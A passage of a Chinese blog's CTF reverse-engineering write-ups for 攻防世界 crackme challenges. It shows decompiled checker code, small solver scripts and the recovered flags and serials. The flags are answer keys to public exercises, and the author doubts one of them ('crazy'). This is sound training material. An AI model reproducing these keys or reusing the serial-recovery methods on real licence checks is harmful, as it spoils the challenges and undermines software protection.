&amp;String, 256);  GetDlgItemTextA(hDlg, 1002, v11, 256);  if ( strstr(&amp;String, &quot;@&quot;) &amp;&amp; strstr(&amp;String, &quot;.&quot;) &amp;&amp; strstr(&amp;String, &quot;.&quot;)[1] &amp;&amp; strstr(&amp;String, &quot;@&quot;)[1] != 46 )  &#123;    v28 = xmmword_410AA0;    v29 = 1701999980;    *(_OWORD *)Src = xmmword_410A90;    v30 = 46;    v26 = xmmword_410A80;    v27 = 3830633;    if ( strlen(v11) != 16      || v11[0] != 67      || v23 != 88      || v11[1] != 90      || v11[1] + v22 != 155      || v11[2] != 57      || v11[2] + v21 != 155      || v11[3] != 100      || v20 != 55      || v12 != 109      || v19 != 71      || v13 != 113      || v13 + v18 != 170      || v14 != 52      || v17 != 103      || v15 != 99      || v16 != 56 )    &#123;      strcpy_s(&amp;Text, 0x100u, (const char *)&amp;v28);    &#125;    else    &#123;      strcpy_s(&amp;Text, 0x100u, Src);      strcat_s(&amp;Text, 0x100u, v11);    &#125;  &#125;  else  &#123;    strcpy_s(&amp;Text, 0x100u, &quot;Your E-mail address in not valid.&quot;);  &#125;  MessageBoxA(hDlg, &amp;Text, &quot;Registeration&quot;, 0x40u);  return 1;&#125;</code></pre><p>过程十分简单，先简单判断邮箱是不是符合格式，如果符合进入序列号的判断，序列号的判断关键也就只有一个if条件，然后就会输出注册有没有成功</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;string&gt;using namespace std;int main() &#123;    char v11[17]=&#123;0&#125;;    v11[0] = &#39;C&#39;;    v11[15] = &#39;X&#39;;    v11[1] = &#39;Z&#39;;    v11[14] = 155-v11[1];    v11[2] = 57;     v11[13] = 155-v11[2];    v11[3] = 100;    v11[12] = 55;    v11[4] = 109;    v11[11] = 71;    v11[5] = 113;    v11[10] = 170-v11[5];    v11[6] = 52;    v11[9] = 103;    v11[7] = 99;    v11[8] = 56;    cout&lt;&lt;v11&lt;&lt;endl;    return 0;&#125;</code></pre><p>输出结果为</p><pre><code>CZ9dmq4c8g9G7bAX</code></pre><h4 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h4><p>通过字符串找到关键函数</p><pre><code class="c++">int __stdcall sub_401090(HWND hWnd, int a2, int a3, int a4)&#123;  char v5; // [esp+50h] [ebp-310h]  CHAR Text[4]; // [esp+154h] [ebp-20Ch]  char v7; // [esp+159h] [ebp-207h]  __int16 v8; // [esp+255h] [ebp-10Bh]  char v9; // [esp+257h] [ebp-109h]  int v10; // [esp+258h] [ebp-108h]  CHAR String; // [esp+25Ch] [ebp-104h]  char v12; // [esp+25Fh] [ebp-101h]  char v13; // [esp+260h] [ebp-100h]  char v14; // [esp+261h] [ebp-FFh]  memset(&amp;String, 0, 0x104u);  v10 = 0;  if ( a2 == 16 )  &#123;    DestroyWindow(hWnd);    PostQuitMessage(0);  &#125;  else if ( a2 == 273 )  &#123;    if ( a3 == 1000 )    &#123;      GetDlgItemTextA(hWnd, 1002, &amp;String, 260);      strlen(&amp;String);      if ( strlen(&amp;String) &gt; 6 )        ExitProcess(0);      v10 = atoi(&amp;String) + 1;      if ( v10 == 123 &amp;&amp; v12 == &#39;x&#39; &amp;&amp; v14 == &#39;z&#39; &amp;&amp; v13 == &#39;y&#39; )      &#123;        strcpy(Text, &quot;flag&quot;);        memset(&amp;v7, 0, 0xFCu);        v8 = 0;        v9 = 0;        _itoa(v10, &amp;v5, 10);        strcat(Text, &quot;&#123;&quot;);        strcat(Text, &amp;v5);        strcat(Text, &quot;_&quot;);        strcat(Text, &quot;Buff3r_0v3rf|0w&quot;);        strcat(Text, &quot;&#125;&quot;);        MessageBoxA(0, Text, &quot;well done&quot;, 0);      &#125;      SetTimer(hWnd, 1u, 0x3E8u, TimerFunc);    &#125;    if ( a3 == 1001 )      KillTimer(hWnd, 1u);  &#125;  return 0;&#125;</code></pre><p>发现我们只要输入122xyz，就会输出flag，而且flag也可以直接拼凑出来</p><pre><code>flag&#123;123_Buff3r_0v3rf|0w&#125;</code></pre><h4 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h4><p>这题题目里面的if实在是太多了，主要是为了判断是不是有debugger，所以不能通过调试的方式获得flag，所以还是要研究一下代码</p><pre><code class="c++">if ( strlen(bufParentRead) == 42 )          &#123;            if ( !strncmp(&amp;bufParentRead[1], &quot;53fc275d81&quot;, 10uLL) )            &#123;              if ( bufParentRead[strlen(bufParentRead) - 1] == &#39;&#125;&#39; )              &#123;                if ( !strncmp(&amp;bufParentRead[31], &quot;4938ae4efd&quot;, 10uLL) )                &#123;                  if ( !confuseKey(bufParentRead, 42) )                  &#123;                    responseFalse();                  &#125;                  else if ( !strncmp(bufParentRead, &quot;&#123;daf29f59034938ae4efd53fc275d81053ed5be8c&#125;&quot;, 42uLL) )                  &#123;                    responseTrue();                  &#125;                  else                  &#123;                    responseFalse();                  &#125;                &#125;                else                &#123;                  responseFalse();                &#125;              &#125;              else              &#123;                responseFalse();              &#125;            &#125;            else            &#123;              responseFalse();            &#125;</code></pre><p>截取了其中一段，这里把flag分成了4个部分，每段10个字符，已经知道第一段地最后一段，但是也知道经过<code>confuseKey()</code>之后flag是什么，所以我们只要研究一下<code>confusekey()</code>就可以了</p><pre><code class="c++">bool __cdecl confuseKey(char *szKey, int iKeyLength)&#123;  char szPart1[15]; // [rsp+10h] [rbp-50h]  char szPart2[15]; // [rsp+20h] [rbp-40h]  char szPart3[15]; // [rsp+30h] [rbp-30h]  char szPart4[15]; // [rsp+40h] [rbp-20h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  *(_QWORD *)szPart1 = 0LL;  *(_DWORD *)&amp;szPart1[8] = 0;  *(_WORD *)&amp;szPart1[12] = 0;  szPart1[14] = 0;  *(_QWORD *)szPart2 = 0LL;  *(_DWORD *)&amp;szPart2[8] = 0;  *(_WORD *)&amp;szPart2[12] = 0;  szPart2[14] = 0;  *(_QWORD *)szPart3 = 0LL;  *(_DWORD *)&amp;szPart3[8] = 0;  *(_WORD *)&amp;szPart3[12] = 0;  szPart3[14] = 0;  *(_QWORD *)szPart4 = 0LL;  *(_DWORD *)&amp;szPart4[8] = 0;  *(_WORD *)&amp;szPart4[12] = 0;  szPart4[14] = 0;  if ( iKeyLength != 42 )    return 0;  if ( !szKey )    return 0;  if ( strlen(szKey) != 42 )    return 0;  if ( *szKey != &#39;&#123;&#39; )    return 0;  strncpy(szPart1, szKey + 1, 0xAuLL);  strncpy(szPart2, szKey + 11, 0xAuLL);  strncpy(szPart3, szKey + 21, 0xAuLL);  strncpy(szPart4, szKey + 31, 0xAuLL);  memset(szKey, 0, iKeyLength);  *szKey = 123;  strcat(szKey, szPart3);  strcat(szKey, szPart4);  strcat(szKey, szPart1);  strcat(szKey, szPart2);  szKey[41] = 125;  return 1;&#125;</code></pre><p>内容挺多，实际上只实现了一件事情，把四段调换了一个顺序，变成了3421的顺序，所以调整一下顺序就出来了</p><pre><code>53fc275d81053ed5be8cdaf29f59034938ae4efd</code></pre><h4 id="crazy"><a href="#crazy" class="headerlink" title="crazy"></a>crazy</h4><p>这题c++17编写，还有类，乍一看有点复杂，但实际上不是很难</p><p>还是先看关键函数，这里在main函数里就进行了处理</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  __int64 v9; // rax  __int64 v10; // rax  __int64 v11; // rax  __int64 v12; // rax  __int64 v13; // rax  __int64 v14; // rax  __int64 v15; // rax  __int64 v16; // rax  char v18; // [rsp+10h] [rbp-130h]  char v19; // [rsp+30h] [rbp-110h]  char v20; // [rsp+50h] [rbp-F0h]  char v21; // [rsp+70h] [rbp-D0h]  char v22; // [rsp+90h] [rbp-B0h]  char v23; // [rsp+B0h] [rbp-90h]  unsigned __int64 v24; // [rsp+128h] [rbp-18h]  v24 = __readfsqword(0x28u);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v18, argv, envp);  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;v18);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Quote from people&#39;s champ&quot;);  std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;*My goal was never to be the loudest or the craziest. It was to be the most entertaining.&quot;);  std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;*Wrestling was like stand-up comedy for me.&quot;);  std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(         &amp;std::cout,         &quot;*I like to use the hard times in the past to motivate me today.&quot;);  std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;-------------------------------------------&quot;);  std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  HighTemplar::HighTemplar((DarkTemplar *)&amp;v23, (__int64)&amp;v18);  v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Checking....&quot;);  std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v19, &amp;v18);  func1((__int64)&amp;v20, (__int64)&amp;v19);  func2((__int64)&amp;v21, (__int64)&amp;v20);  func3((__int64)&amp;v21, 0);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v21);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v20);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v19);  HighTemplar::calculate((HighTemplar *)&amp;v23);  if ( (unsigned int)HighTemplar::getSerial((HighTemplar *)&amp;v23) == 0 )  &#123;    v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;/////////////////////////////////&quot;);    std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Do not be angry. Happy Hacking :)&quot;);    std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;/////////////////////////////////&quot;);    std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    ZN11HighTemplar7getFlagB5cxx11Ev((__int64)&amp;v22, (__int64)&amp;v23);    v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;flag&#123;&quot;);    v15 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v14, &amp;v22);    v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v15, &quot;&#125;&quot;);    std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v22);  &#125;  HighTemplar::~HighTemplar((HighTemplar *)&amp;v23);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v18);  return 0;&#125;</code></pre><p>乍一看很复杂，慢慢分析，发现了一个输入，被赋值给了<code>v18</code>，然后发现一个类的构造函数调用了我们输入的字符串，可以理解为，用我们的字符串初始化了类中的数据成员，进去仔细看看</p><pre><code class="c++">nsigned __int64 __fastcall HighTemplar::HighTemplar(DarkTemplar *a1, __int64 a2)&#123;  char v3; // [rsp+17h] [rbp-19h]  unsigned __int64 v4; // [rsp+18h] [rbp-18h]  v4 = __readfsqword(0x28u);  DarkTemplar::DarkTemplar(a1);  *(_QWORD *)a1 = &amp;off_401EA0;  *((_DWORD *)a1 + 3) = 0;  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 16, a2);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string((char *)a1 + 48, a2);  std::allocator&lt;char&gt;::allocator(&amp;v3, a2);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(    (char *)a1 + 80,    &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;,    &amp;v3);  std::allocator&lt;char&gt;::~allocator(&amp;v3);  return __readfsqword(0x28u) ^ v4;&#125;</code></pre><p>从这里看，类里面至少应该有一个<code>getSerial()</code>函数在<code>off_401EA0</code>处，三个字符串，偏移量分别为16，48，80，长度都是32位，还有一个布尔型变量，偏移量位3，并且我们还知道，我们的数据被传入了一个变量<code>v23</code>里，然后返回去，跟踪<code>v23</code>，找到剩下的关键函数</p><pre><code class="c++">bool __fastcall HighTemplar::calculate(HighTemplar *this)&#123;  __int64 v1; // rax  _BYTE *v2; // rbx  bool result; // al  _BYTE *v4; // rbx  int i; // [rsp+18h] [rbp-18h]  int j; // [rsp+1Ch] [rbp-14h]  if ( std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16) != 32 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Too short or too long&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    exit(-1);  &#125;  for ( i = 0;        i &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);        ++i )  &#123;    v2 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                    (char *)this + 16,                    i);    *v2 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                       (char *)this + 16,                       i) ^ 0x50)        + 23;  &#125;  for ( j = 0; ; ++j )  &#123;    result = j &lt;= (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);    if ( !result )      break;    v4 = (_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                    (char *)this + 16,                    j);    *v4 = (*(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                       (char *)this + 16,                       j) ^ 0x13)        + 11;  &#125;  return result;&#125;</code></pre><p>这一看就是个加密函数，并且只对偏移量位16处的字符串进行了操作，这里正好是我们输入的字符串，虽然有两个for循环，但是都是对同一个字符串的同一个位置进行操作，很好逆向，加密完之后应该还会有一个验证，找到下面的验证函数</p><pre><code class="c++">__int64 __fastcall HighTemplar::getSerial(HighTemplar *this)&#123;  __int64 v1; // rbx  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  unsigned int i; // [rsp+1Ch] [rbp-14h]  for ( i = 0;        (signed int)i &lt; (unsigned __int64)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length((char *)this + 16);        ++i )  &#123;    v1 = *(unsigned __int8 *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                               (char *)this + 80,                               (signed int)i);    if ( (_BYTE)v1 != *(_BYTE *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator[](                                  (char *)this + 16,                                  (signed int)i) )    &#123;      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;You did not pass &quot;);      v5 = std::ostream::operator&lt;&lt;(v4, i);      std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      *((_DWORD *)this + 3) = 1;      return *((unsigned int *)this + 3);    &#125;    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Pass &quot;);    v3 = std::ostream::operator&lt;&lt;(v2, i);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  return *((unsigned int *)this + 3);&#125;</code></pre><p>这个函数不长，很简单的验证了加密过后的字符串和偏移量位80的字符串是不是一样，用偏移量位3处的布尔值作为返回值，如果相同返回0，回到主函数，接下来就成功了，没有其他的变换和判断，所以这个程序实际上非常简单</p><pre><code class="python">target = &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;flag = &#39;&#39;for i in target:    flag += chr((((ord(i) - 11) ^ 0x13) - 23) ^ 0x50)print(flag)</code></pre><p>很简单就可以逆向出，套上<code>flag&#123;&#125;</code>提交即可（这个flag长得实在不像是正确的）</p><pre><code>flag&#123;tMx~qdstOs~crvtwb~aOba&#125;qddtbrtcd&#125;</code></pre><h4 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h4><p>pyc格式，直接uncompyle6反编译，成功，没有对pyc文件动什么手脚，反编译后的源代码如下</p><pre><code class="python">import md5md5s = [ 174282896860968005525213562254350376167, 137092044126081477479435678296496849608, 126300127609096051658061491018211963916, 314989972419727999226545215739316729360, 256525866025901597224592941642385934114, 115141138810151571209618282728408211053, 8705973470942652577929336993839061582, 256697681645515528548061291580728800189, 39818552652170274340851144295913091599, 65313561977812018046200997898904313350, 230909080238053318105407334248228870753, 196125799557195268866757688147870815374, 74874145132345503095307276614727915885]print &#39;Can you turn me back to python ? ...&#39;flag = raw_input(&#39;well as you wish.. what is the flag: &#39;)if len(flag) &gt; 69:    print &#39;nice try&#39;    exit()if len(flag) % 5 != 0:    print &#39;nice try&#39;    exit()for i in range(0, len(flag), 5):    s = flag[i:i + 5]    if int(&#39;0x&#39; + md5.new(s).hexdigest(), 16) != md5s[(i / 5)]:        print &#39;nice try&#39;        exit()print &#39;Congratz now you have the flag&#39;</code></pre><p>发现给出了很多md5，把flag每5个字符一组，算出md5要和给出的相同，所以用这些<a href="https://www.somd5.com/">md5在线解密</a></p><p>组合起来就是flag</p><pre><code>ALEXCTF&#123;dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k&#125;</code></pre><h4 id="anser-to-everything"><a href="#anser-to-everything" class="headerlink" title="anser_to_everything"></a>anser_to_everything</h4><p>IDA打开</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-4h]  printf(&quot;Gimme: &quot;, argv, envp);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  not_the_flag(v4);  return 0;&#125;//not_the_flag__int64 __fastcall not_the_flag(int a1)&#123;  if ( a1 == &#39;*&#39; )    puts(&quot;Cipher from Bill \nSubmit without any tags\n#kdudpeh&quot;);  else    puts(&quot;YOUSUCK&quot;);  return 0LL;&#125;</code></pre><p>找到了一个字符串<code>kdudpeh</code>，根据题目提示，sha1加密得<code>80ee2a3fe31da904c596d993f7f1de4827c1450a</code></p><p>套上flag得</p><pre><code>flag&#123;80ee2a3fe31da904c596d993f7f1de4827c1450a&#125;</code></pre><h4 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h4><p>IDA打开，main函数如下</p><pre><code class="c++">int __cdecl main(int a1, char **a2)&#123;  if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0) )  &#123;    puts(unk_80487E4);    sub_8048538((int)a2[1]);  &#125;  else  &#123;    puts(&quot;Access denied&quot;);  &#125;  return 0;&#125;</code></pre><p>我们得输入作为main函数得参数传入，在<code>sub_8048414()</code>函数中进行了一个判断，然后进入<code>sub_8048538()</code>函数处理后输出flag</p><pre><code class="c++">signed int __cdecl sub_8048414(_BYTE *a1, int a2)&#123;  signed int result; // eax  switch ( a2 )  &#123;    case 0:      if ( *a1 == &#39;i&#39; )        goto LABEL_19;      result = 0;      break;    case 1:      if ( *a1 == &#39;e&#39; )        goto LABEL_19;      result = 0;      break;    case 3:      if ( *a1 == &#39;n&#39; )        goto LABEL_19;      result = 0;      break;    case 4:      if ( *a1 == &#39;d&#39; )        goto LABEL_19;      result = 0;      break;    case 5:      if ( *a1 == &#39;a&#39; )        goto LABEL_19;      result = 0;      break;    case 6:      if ( *a1 == &#39;g&#39; )        goto LABEL_19;      result = 0;      break;    case 7:      if ( *a1 == &#39;s&#39; )        goto LABEL_19;      result = 0;      break;    case 9:      if ( *a1 == &#39;r&#39; )LABEL_19:        result = sub_8048414(a1 + 1, 7 * (a2 + 1) % 11);      else        result = 0;      break;    default:      result = 1;      break;  &#125;  return result;&#125;</code></pre><p>判断得过程是一个递归，因为返回值要为1，所以递归过程中得每一个if都需要满足，所以很好得到输入的字符串是什么</p><pre><code class="c++">int __cdecl sub_8048538(int a1)&#123;  int v2[33]; // [esp+18h] [ebp-A0h]  int i; // [esp+9Ch] [ebp-1Ch]  qmemcpy(v2, &amp;unk_8048760, sizeof(v2));  for ( i = 0; i &lt;= 32; ++i )    putchar(v2[i] ^ *(char *)(a1 + i % 8));  return putchar(10);&#125;</code></pre><p>输出部分只进行了一个很简单的处理，而且不需要逆向，直接用同样的方式处理即可</p><pre><code class="python">targrt = &#39;ie_ndags_r&#39;f = &#39;&#39;j = 0for i in range(8):    f += targrt[j]    j = 7 * (j + 1) % 11# print(f)flag = &#39;&#39;a2 = [0x0F, 0x1F, 0x04, 0x09, 0x1C, 0x12, 0x42, 0x09, 0x0C, 0x44, 0x0D, 0x07, 0x09, 0x06, 0x2D,      0x37, 0x59, 0x1E, 0x00, 0x59, 0x0F, 0x08, 0x1C, 0x23, 0x36, 0x07, 0x55, 0x02, 0x0C, 0x08,      0x41, 0x0A, 0x14]for i in range(33):    flag += chr(a2[i] ^ ord(f[i % 8]))print(flag)</code></pre><p>输出flag</p><pre><code>flag&#123;s0me7hing_S0me7hinG_t0lki3n&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（一）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>攻防世界的题目质量还是比较高的，题目类型很多，难度也有一定的梯度，挺适合不断进阶学习。</p><span id="more"></span><h4 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h4><p>IDA打开，进入main，发现程序在生成随机数，然后随便输出一系列字符串中的某一个，找到这一系列字符串，发现了flag</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  unsigned int v3; // eax  unsigned int v4; // eax  puts(&quot;Reticulating splines, please wait..&quot;);  sleep(5u);  v3 = time(0);  srand(v3);  v4 = rand();  puts((&amp;strs)[v4 % 0xA]);  return 0;&#125;</code></pre><p>找到strs，其中flag</p><pre><code>9447&#123;This_is_a_flag&#125;</code></pre><h4 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h4><p>这题真就连源代码都给了</p><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123;    if (argc != 4) &#123;        printf(&quot;what?\n&quot;);        exit(1);    &#125;    unsigned int first = atoi(argv[1]);    if (first != 0xcafe) &#123;        printf(&quot;you are wrong, sorry.\n&quot;);        exit(2);    &#125;    unsigned int second = atoi(argv[2]);    if (second % 5 == 3 || second % 17 != 8) &#123;        printf(&quot;ha, you won&#39;t get it!\n&quot;);        exit(3);    &#125;    if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123;        printf(&quot;so close, dude!\n&quot;);        exit(4);    &#125;    printf(&quot;Brr wrrr grr\n&quot;);    unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;&#125;</code></pre><p>看一下源码，发现运行时要有三个参数，第一个参数给出来了，是0xcafe，第二个没有给，但是知道second%17==8，直接带到下面计算就行了，第三个是字符串的长度，为7，直接算出来就行了。</p><p>不过还需要注意，最后输出的时候是以16进制的形式输出</p><pre><code>c0ffee</code></pre><h4 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h4><p>题如其名，拿到直接upx脱壳，毫无阻碍，IDA打开直接在main里看到flag</p><pre><code>flag&#123;Upx_1s_n0t_a_d3liv3r_c0mp4ny&#125;</code></pre><h4 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h4><p>IDA打开，找到关键判断位置</p><pre><code class="c++">strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);  v7 = &#39;ebmarah&#39;;  v6 = 7;  printf(&quot;Welcome to the RC3 secure password guesser.\n&quot;, a2, a3);  printf(&quot;To continue, you must enter the correct password.\n&quot;);  printf(&quot;Enter your guess: &quot;);  __isoc99_scanf(&quot;%32s&quot;, s);  v3 = strlen(s);  if ( v3 &lt; strlen(v8) )    sub_4007C0(v8);  for ( i = 0; i &lt; strlen(s); ++i )  &#123;    if ( i &gt;= strlen(v8) )      ((void (*)(void))sub_4007C0)();    if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )      ((void (*)(void))sub_4007C0)();  &#125;</code></pre><p>v7本身是一个长整型，但是作为字符读取，由于小端序，所以转换成的字符要反序，然后经过下面的计算就可以了</p><pre><code class="python">v8 = &#39;:\&quot;AL_RT^L*.?+6/46&#39;v7 = &#39;harambe&#39;s = &#39;&#39;for i in range(len(v8)):    s += chr(ord(v7[i % 7]) ^ ord(v8[i]))print(s)</code></pre><p>输出结果</p><pre><code>RC3-2016-XORISGUD</code></pre><h4 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h4><p>见CG-CTF py交易</p><h4 id="game"><a href="#game" class="headerlink" title="game"></a>game</h4><p>见BUGKU 游戏过关</p><h4 id="hello-ctf"><a href="#hello-ctf" class="headerlink" title="hello-ctf"></a>hello-ctf</h4><p>一串输入的字符串拷贝来拷贝去，实际上就是把输入的字符串变成16进制，所以直接从16进制转换成字符串就可以了</p><pre><code class="python">s = &#39;437261636b4d654a757374466f7246756e&#39;flag = bytes.fromhex(s)print(flag)</code></pre><p>直接输出flag</p><pre><code>CrackMeJustForFun</code></pre><h4 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h4><p>同样是一道简单题，写个简单的逆运算就可以了</p><pre><code class="python">s = &#39;c61b68366edeb7bdce3c6820314b7498&#39;t = &#39;&#39;v5 = 0while (v5 &lt; len(s)):    if (v5 &amp; 1):        v3 = 1    else:        v3 = -1    t += chr(ord(s[v5]) + v3)    v5 = v5 + 1t=&#39;SharifCTF&#123;&#39;+t+&#39;&#125;&#39;print(t)</code></pre><p>输出flag</p><pre><code>SharifCTF&#123;b70c59275fcfa8aebf2d5911223c6589&#125;</code></pre><h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><p>IDA打开追踪字符串，发现flag和输入直接进行比较，找到flag的位置，然后将16进制转换位字符串然后逆序即可</p><pre><code>DUTCTF&#123;We1c0met0DUTCTF&#125;</code></pre><h4 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" 